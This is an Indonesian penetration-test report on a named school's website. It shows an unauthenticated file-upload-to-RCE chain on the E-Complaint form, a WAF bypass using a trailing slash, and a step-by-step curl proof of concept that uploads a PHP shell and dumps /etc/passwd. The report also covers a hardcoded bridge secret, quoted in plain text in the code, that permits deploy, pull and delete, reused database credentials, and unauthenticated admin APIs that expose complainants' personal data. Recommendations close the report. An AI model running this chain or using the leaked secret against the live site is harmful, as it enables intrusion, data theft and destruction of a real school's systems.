# Report-2 — "Truncated AI Slop": Unrestricted File Upload → Remote Code Execution Tanpa Autentikasi

**Target:** `https://smpm12gkb.sch.id/` (SMP Muhammadiyah 12 GKB, Gresik)
**Tanggal:** 16 Oktober 2026
**Penulis:** TIKI LICKY
**Klasifikasi:** CRITICAL
**Vektor:** Aplikasi web custom (PHP) di bawah `/app/` yang di-generate/di-"vibe-code" dengan AI.

---

## 1. Ringkasan Eksekutif

Situs berjalan di WordPress 7.1.3 (Hostinger, PHP 8.3.35, server `hcdn`). Namun sebagian besar fungsi kerja sekolah — E-Complaint, AISA Chat, Discovery, Formulir Inden, SPMB, dsb. — **bukan plugin WordPress**, melainkan aplikasi PHP custom yang diletakkan di bawah `/app/`. Kode aplikasi ini memperlihatkan pola khas hasil generator AI: tanpa validasi input, tanpa pemeriksaan otentikasi, kredensial di-hardcode, dan struktur direktori "asal jalan".

Tema Report-2 adalah **file upload**: field lampiran pada form E-Complaint tidak divalidasi sama sekali. Kombinasi tiga cacat — (a) ekstensi file dipertahankan apa adanya, (b) file disimpan di direktori **yang dapat diakses web** (`/app/page/files/`), dan (c) aturan WAF edge yang menutup celah itu **dapat dilewati dengan satu karakter** — menghasilkan **Remote Code Execution tanpa autentikasi**.

Ditambah jalur kedua: `/app/bridge.php` memuat **secret key hardcoded**, sehingga siapa pun dapat meng-upload paket ZIP (deploy), men-download arsip (pull), dan **menghapus seluruh direktori proyek** (delete) tanpa autentikasi.

Dampak: eksekusi kode sebagai user hosting `u576897008`, baca file arbitrer (`/etc/passwd`, `wp-config.php`, `db_config.php`), enumerasi direktori, dan kendali destruktif atas aplikasi.

---

## 2. Alur Serangan (Unauthenticated RCE)

```
[1] POST /app/page/E-Complaint/api.php        action=submit_complaint
    └─ pendukung=@shell.php   → file diterima, ekstensi .php dipertahankan
    └─ disimpan di  /app/page/files/complaint_EC-..._<uniqid>.php   (BUKAN upload dir privat)

[2] GET  /app/page/files/complaint_EC-..._<uniqid>.php
    └─ 403 (WAF edge hcdn memblokir pola /app/**/{files,...}/*.php)

[3] GET  /app/page/files/complaint_EC-..._<uniqid>.php/     <-- tambah "/" di akhir
    └─ 200 OK, PHP DIEKSEKUSI   (regex WAF ter-anchor pada ".php$", PATH_INFO lolos)
```

---

## 3. Temuan

### F1 — CRITICAL: Unrestricted File Upload berujung Unauthenticated RCE

**Komponen:** `/app/page/E-Complaint/api.php` (action `submit_complaint`)
**CWE:** CWE-434 (Unrestricted Upload of File with Dangerous Type) + CWE-98 (PHP Remote File Inclusion / direct execution)
**Auth:** Tidak ada (halaman publik).

**Kode rentan (kutipan asli `api.php`):**

```php
// File Upload (Save to parent 'files' directory to share with main app)
$pendukung = "";
if (isset($_FILES['pendukung']) && $_FILES['pendukung']['error'] == 0) {
    $target_dir = "../files/"; // Path relative to ecomplaint2/
    if (!file_exists($target_dir)) {
        mkdir($target_dir, 0777, true);
    }
    $file_extension = pathinfo($_FILES["pendukung"]["name"], PATHINFO_EXTENSION);
    $new_filename = "complaint_" . $no_tiket . "_" . time() . "." . $file_extension;
    $target_file = $target_dir . $new_filename;
    if (move_uploaded_file($_FILES["pendukung"]["tmp_name"], $target_file)) {
        $pendukung = $new_filename;
    }
}
```

Tidak ada whitelist ekstensi, tidak ada validasi MIME, tidak ada `getimagesize()`. Ekstensi diambil mentah dari `pathinfo()` nama file user. Direktori tujuan `../files/` = `/app/page/files/`, berada **di dalam webroot**.

**Bukti 3 (file web-accessible):** file `.txt` yang di-upload diambil kembali utuh:

```
GET /app/page/files/complaint_EC-44450616102026_1792133144.txt  →  200 OK
body: FOUND_DIR_TXT_12345
```

**Pertahanan satu-satunya = WAF edge.** Request langsung ke `.php` diblokir:

```
GET /app/page/files/complaint_EC-..._....php    → 403 (WAF hcdn)
```

Namun aturan WAF ter-anchor pada akhir string (`.php$`). Menambahkan `/` (atau PATH_INFO) membuat URL tidak berakhir `.php`, sehingga WAF lolos, sementara web server tetap mengeksekusi file PHP:

```
GET /app/page/files/complaint_EC-..._....php/     → 200 OK, EKSEKUSI
GET /app/page/files/complaint_EC-..._....php/.    → 200 OK, EKSEKUSI
GET /app/page/files/complaint_EC-..._....php/x    → 200 OK, EKSEKUSI
```

**Bukti RCE** (`<?php echo "RCE_OK\n"; ... ?>` yang di-upload lalu dipanggil dengan trailing slash):

```
HTTP/2 200
content-type: text/plain;charset=UTF-8
x-powered-by: PHP/8.3.35

RCE_OK
PHP=8.3.35
UNAME=Linux id-dci-web1633.main-hosting.eu 5.14.0-611.55.1.el9_7.x86_64 #1 SMP PREEMPT_DYNAMIC ... x86_64
USER=u576897008
CWD=/home/u576897008/domains/smpm12gkb.sch.id/public_html/app/page/files
```

`disable_functions` berisi `system, exec, shell_exec, passthru, popen, proc_open` — namun itu tidak menahan, karena PHP runtime tetap jalan penuh: `file_get_contents()`, `scandir()`, `include`, dsb.

**Bukti baca file arbitrer & enumerasi direktori:**

```
== /etc/passwd (head) ==        -> terbaca (mail, exim, apache, mysql, ...)
== disabled_functions ==        -> system, exec, shell_exec, passthru, ... proc_open
== DOCROOT ROOT listing ==      -> wp-config.php, wp-admin, app, ppdb, spmb,
                                   slims9_bulian-9.7.2, tamanilmu, virtualclass,
                                   .htaccess.bk, .well-known.zip, interviewsmp.zip, ...
== /app listing ==              -> bridge.php, guard.php, form, misc, page, tools
== /app/page listing ==         -> "AISA Chat", Discovery, E-Complaint,
                                   "formulir inden", files
```

**PoC reproduksi (end-to-end):**

```bash
TARGET="https://smpm12gkb.sch.id"

# 1. Payload
cat > shell.php <<'EOF'
<?php
header('Content-Type: text/plain');
echo "RCE_OK\n";
echo "USER=".get_current_user()."\n";
echo "CWD=".getcwd()."\n";
echo file_get_contents('/etc/passwd');
EOF

# 2. Upload tanpa autentikasi (ekstensi .php dipertahankan)
curl -s -X POST "$TARGET/app/page/E-Complaint/api.php" \
  -F "action=submit_complaint" \
  -F "nama=RCEPoC" -F "telp=+628111222333" -F "email=rce@example.com" \
  -F "jenis=Masyarakat Umum" -F "lingkup=Sarana Prasarana" \
  -F "keluhan=RCE proof" -F "terms=on" \
  -F "pendukung=@shell.php;filename=shell.php;type=application/x-php"
# -> {"status":"success","ticket_id":"EC-43510616102026","aisa_status":{...}}

# 3. Ambil nama file tersimpan
curl -s "$TARGET/app/page/E-Complaint/api.php?action=get_status&ticket_id=EC-43510616102026"
# -> "pendukung":"complaint_EC-43510616102026_1792133503.php"

# 4. Trigger eksekusi — perhatikan TANDA "/" di akhir (bypass WAF)
curl -s "$TARGET/app/page/files/complaint_EC-43510616102026_1792133503.php/"
# -> HTTP/2 200 ; RCE_OK ; PHP=8.3.35 ; USER=u576897008 ; /etc/passwd dump
```

> Catatan: seluruh artefak uji (file & tiket) sudah dihapus dari server setelah capture. Nama file di atas bersifat historis.

**Matriks orientasi ekstensi** (disimpan apa adanya; hanya eksekusi `.php`-family bermakna, sisanya plain-text):

| Ekstensi | Status PUT (`/app/page/files/x`) | Hasil |
|---|---|---|
| `.php .phtml .php3 .php4 .php5 .php7 .phps .cgi .pl .sh` | 403 | diblok WAF (pola URL) |
| `.php8 .pht .phar .shtml .phtm .phtm5 .asp .aspx .jsp .py .asa .cer` | 200 | disajikan **mentah** (plain text, bukan dieksekusi) |
| `.txt .jpg` | 200 | file utuh (bukti direktori web-accessible) |

Hanya keluarga `.php` yang dieksekusi oleh host — dan itulah yang diblok WAF, namun bypass trailing slash mengembalikannya.

---

### F2 — CRITICAL: Secret Key Hardcoded pada `bridge.php` → Deploy ZIP / Pull / Delete tanpa Autentikasi

**Komponen:** `/app/bridge.php` ("SPEMDALAS SYNC BRIDGE")
**CWE:** CWE-798 (Use of Hard-coded Credentials) + CWE-434

```php
// SETTING KUNCI RAHASIA (Ganti dengan token acak Anda jika ingin lebih aman)
define('BRIDGE_SECRET_KEY', 'SPEMDALAS_APP_SYNC_SECRET_2026');
...
if ($authHeader !== BRIDGE_SECRET_KEY) {
    http_response_code(403);
    echo json_encode(['status'=>'error','message'=>'Akses ditolak: ...']);
    exit;
}
```

Secret dipakai untuk mengautentikasi tiga aksi berbahaya:

- **`deploy`** — menerima ZIP (`$_FILES['package']`) dan mengekstraknya ke `APP_ROOT/<kategori>` (`page|form|tools|misc`) → unggah webshell massal → RCE.
- **`pull`** — men-zip seluruh direktori proyek lalu mengirimnya sebagai unduhan → eksfiltrasi kode & sumber.
- **`delete`** — menghapus direktori proyek secara rekursif (`removeDirectoryRecursively`) → penghancuran data.

**Bukti (auth bypass dengan secret yang bocor):**

```
$ curl -H "X-Spemdalas-Auth: SPEMDALAS_APP_SYNC_SECRET_<REDACTED>" \
       "https://smpm12gkb.sch.id/app/bridge.php?action=ping"
{
    "status": "success",
    "message": "Spemdalas Sync Bridge AKTIF dan SIAP.",
    "php_version": "8.3.35",
    "zip_archive_installed": true,
    "app_root": "/home/u576897008/domains/smpm12gkb.sch.id/public_html/app",
    "categories": { "page": {...}, "form": {...}, "tools": {...}, "misc": {...} }
}

$ curl "https://smpm12gkb.sch.id/app/bridge.php?action=ping"
{ "status": "error", "message": "Akses ditolak: Secret Key tidak cocok atau tidak disertakan." }
```

Karena secret bersifat statis dan tertanam di source yang dapat dibaca (lewat RCE F1 atau bila source pernah bocor), autentikasi tidak bernilai. Aksi `deploy` dengan ZIP berisi `.php` langsung memberi RCE; `delete` bersifat destruktif fatal.

---

### F3 — HIGH: Kredensial Database Hardcoded & Digunakan Ulang di Banyak Aplikasi

**CWE:** CWE-798. Kredensial DB yang sama tertanam di banyak `config.php`:

```php
// app/page/E-Complaint/db_config.php
$host="153.92.15.33"; $username="u576897008_orderpublikasi";
$password="<REDACTED>"; $database="u576897008_orderpublikasi";

// app/page/AISA Chat/config.php, app/page/Discovery/config.php,
// app/page/formulir inden/config.php  -> user/pass/db IDENTIK
```

Selain itu `AISA Chat/config.php` dan `Discovery/config.php` mencoba kredensial fallback `root` tanpa password:

```php
["host"=>"127.0.0.1","user"=>"root","pass"=>"","db"=>$db_name],
["host"=>"localhost","user"=>"root","pass"=>"","db"=>$db_name],
```

`formulir inden/config.php` juga menanam salt HMAC statis `REGISTRATION_SECRET_SALT` (kunci segel kode pendaftaran inden), yang bila diketahui memungkinkan pemalsuan kode pendaftaran.

Kombinasi: satu kebocoran kredensial = kompromi seluruh database sekolah yang dipakai bersama.

---

### F4 — HIGH: API Admin E-Complaint Tanpa Autentikasi

**CWE:** CWE-306 (Missing Authentication for Critical Function). Endpoint `admin_*` pada `api.php` tidak memeriksa sesi/peran apa pun:

| Action | Dampak |
|---|---|
| `admin_get_all` | dump seluruh tiket + PII pelapor (nama, telp, email, isi keluhan) |
| `admin_update_status` | ubah status & `tindak_lanjut` tiket arbitrer |
| `admin_delete` | hapus tiket arbitrer |

```bash
curl "https://smpm12gkb.sch.id/app/page/E-Complaint/api.php?action=admin_get_all"
# -> {"status":"success","data":[ {"tid":..., "nama":..., "telp":..., "email":..., ... ] }
```

`admin.php` di sisi UI memang ditaruh di balik `guard.php`, tetapi **API-nya tidak** — proteksi hanya di lapisan tampilan, bukan di logika.

---

### F5 — MEDIUM: Kebocoran PII via Pencarian (carry-over Report-1, diperkuat)

`action=search_status` mencocokkan `no_tiket OR telp OR email` tanpa pembatasan, sehingga nomor HP/email siapa pun membuka riwayat tiket milik orang lain. Ketika digabung dengan F4, seluruh basis pengaduan dapat dienumerasi.

---

## 4. Akar Masalah: Pola "AI Slop"

Cacat ini bukan bug tunggal, melainkan **pola berulang** yang konsisten dengan kode hasil generate AI tanpa review:

1. **Validasi nol** — `pathinfo()` mengambil ekstensi apa pun; tidak ada whitelist.
2. **Secret hardcoded** — `BRIDGE_SECRET_KEY`, kredensial DB, salt HMAC — semua literal di source.
3. **"Asal jalan"** — direktori upload `../files/` diberi komentar *"to share with main app"*, lalu `mkdir(..., 0777, true)` (permisif).
4. **Autentikasi di UI, bukan di API** — `guard.php` di `admin.php`, tapi `api.php` terbuka.
5. **Error verbose** — `display_errors` On; peringatan PHP membocorkan path absolut server (`/home/u576897008/domains/...`).
6. **Endpoint admin & utilitas berlebih** — `bridge.php` (deploy/pull/delete), `install.php`, `admin_users_import.php`, `admin_users_export.php` ditinggal aktif.
7. **Backup & arsip ikut ter-commit** — `.htaccess.bk`, `.htaccess.old-*`, `interviewsmp.zip`, `pemanggilan.zip`, `tamanilmu(backup)`, `virtualclass_backup`, `.well-known.zip`.

"Truncated" merujuk pada kontrol yang dipotong: pengecekan yang seharusnya ada (whitelist ekstensi, auth API, pengelolaan secret) tidak pernah ditulis, sehingga yang tersisa hanya jalur bahagia (happy path) — dan itu cukup untuk kompromi penuh.

---

## 5. Rekomendasi

1. **Upload:** whitelist ekstensi + MIME di server; rename tanpa ekstensi asli; simpan **di luar webroot**; matikan eksekusi PHP di direktori upload (`php_admin_flag engine off` / equivalen LiteSpeed).
2. **Trigger aman:** sajikan lampiran lewat script dengan `Content-Type: application/octet-stream` + `Content-Disposition: attachment`, bukan akses langsung.
3. **Segera hapus/rotasi:** semua webshell sisa di `/app/page/files/`; ganti `BRIDGE_SECRET_KEY`, semua password DB, dan salt HMAC.
4. **bridge.php:** nonaktifkan, atau lindungi dengan auth kuat + IP allowlist; `deploy`/`delete` tidak boleh tersedia dari internet.
5. **API admin:** terapkan otentikasi & otorisasi di `api.php` (sesi + role), bukan hanya di UI.
6. **Kredensial:** pindahkan ke environment variable per-aplikasi, hilangkan fallback `root` tanpa password.
7. **Hardening host:** matikan `display_errors`; hapus file backup/arsip yang terekspos; audit seluruh isi `/app/`, `ppdb`, `spmb`, `slims9_*`, dsb.
8. **WAF bukan kontrol utama** — perbaiki aplikasinya. Aturan pola URL (seperti blok `.php`) hanya lapisan tambahan dan terbukti dapat dilewati.

---

## 6. Indeks Bukti

| Berkas | Isi |
|---|---|
| `evidence/report2/poc-upload-rce.txt` | Transkrip lengkap: upload `.php` → storage web-accessible → blok WAF → bypass trailing slash → output RCE + baca `/etc/passwd` |
| `evidence/report2/bridge-secret-ping.txt` | `bridge.php?action=ping` dengan secret bocor (redacted) vs tanpa secret |
| `evidence/report2/leaked-configs.txt` | `db_config.php` + `config.php` (AISA/Discovery/Inden), kredensial & salt (redacted) |
| `evidence/report2/extension-matrix.txt` | Matriks ekstensi: disimpan mentah vs diblok WAF vs dieksekusi |

---

*Bukti mentah (un-redacted) tidak dipublikasikan. Semua artefak uji pada server telah dihapus setelah capture.*
